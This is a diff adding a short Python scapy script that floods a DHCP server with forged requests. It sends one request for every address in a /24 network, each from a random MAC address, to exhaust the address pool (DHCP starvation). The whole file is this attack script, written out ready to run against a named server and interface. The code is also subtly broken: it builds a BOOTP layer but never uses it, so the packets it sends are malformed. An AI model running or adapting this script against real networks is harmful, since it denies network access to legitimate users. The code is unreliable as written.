@@ -1,0 +1,48 @@
+# on importe la lib scapy
+from scapy.all import *
+import ipaddress
+
+# Variables
+network = '10.1.10.0/24'
+ipServerDHCP = '10.1.30.1'
+networkInterface= 'wlan0'
+
+# List all ips in the network
+possibleIps = [str(ip) for ip in ipaddress.IPv4Network(network)]
+
+# Proceed to build all the dhcp request and to send them
+for ip in possibleIps:
+
+    macSrc=RandMAC()
+
+
+    ethernet = Ether(
+        src=macSrc,
+        dst="ff:ff:ff:ff:ff:ff"
+        )
+
+    internetProtocol = IP(
+        src="0.0.0.0", 
+        dst="255.255.255.255"
+        )
+
+    udp = UDP(
+        sport=68,
+        dport=67
+        )
+    
+    BOOTP(
+        chaddr=RandString(12, "0123456789abcdef")
+        )
+
+    dhcp = DHCP(options=[
+        ("message-type", "request"),
+        ("server_id", ipServerDHCP),
+        ("requested_addr", ip),
+        ("end")
+        ])
+
+    dhcpRequest = ethernet/internetProtocol/udp/dhcp
+
+    sendp(dhcpRequest,iface=networkInterface, verbose=0)
+
